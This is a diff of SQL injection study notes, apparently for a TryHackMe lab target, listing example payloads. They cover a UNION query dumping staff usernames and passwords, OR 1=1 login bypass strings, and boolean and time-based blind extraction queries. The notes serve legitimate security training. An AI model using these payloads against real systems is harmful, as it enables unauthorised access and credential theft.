@@ -1,22 +1,26 @@
-> In-Band SQL Injection
+> In-Band SQL Injection - Error-Based SQL Injection
 
+```
+article?id=-1 UNION SELECT 1,2,group_concat(username,':',password ) FROM staff_users
+```
 
+> Blind SQLi Injection - Authentication Bypass
 
+```
+login username: admin' OR 1=1-- -
+login password: test' OR 1=1-- -
+```
 
+> Blind SQLi - Boolean Based
 
+```
+https://website.thm/checkuser?username=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
+```
 
-> Error-Based SQL Injection
+> Blind SQLi - Time Base
 
-
-
-
-
-
-> Union-Based SQL Injection
-
-
-
-
-
-
+```
+https://website.thm/analytics?referrer=admin123' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5), 2-- -
+```
 
